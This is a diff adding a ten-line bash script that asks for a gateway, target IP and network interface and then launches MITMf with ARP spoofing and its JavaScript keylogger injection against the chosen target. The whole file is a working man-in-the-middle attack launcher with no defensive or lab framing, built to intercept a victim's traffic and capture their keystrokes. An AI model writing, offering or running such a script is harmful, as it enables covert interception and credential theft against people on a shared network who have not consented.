@@ -1,0 +1,10 @@
+#!/bin/bash
+read -p "Enter your Gateway: " gateway
+echo
+read -p "Enter your Target Ip: " target
+echo
+read -p "Enter your Interface: " interface
+echo
+echo "[*]Your attack will be start wait a minute ....."
+sleep 10s
+./mitmf.py --arp --spoof -i "$interface" --gateway "$gateway" --target "$target" --jskeylogger 
